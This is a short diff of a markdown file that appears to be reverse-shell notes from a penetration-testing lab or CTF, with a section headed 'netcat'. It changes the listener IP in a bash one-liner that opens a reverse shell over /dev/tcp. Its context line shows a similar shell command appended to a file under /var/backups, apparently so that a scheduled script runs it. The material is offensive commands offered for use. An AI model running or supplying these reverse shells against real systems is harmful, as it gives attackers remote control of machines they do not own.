@@ -19,7 +19,7 @@ echo 'bash -c "bash -i >& /dev/tcp/192.168.131.14/9001 0>&1"' >> /var/backups/sc
 ```
 
 ```bash
-bash -c "bash -i >& /dev/tcp/10.10.15.222/9001 0>&1"
+bash -c "bash -i >& /dev/tcp/10.10.17.33/9001 0>&1"
 ```
 
 ### netcat
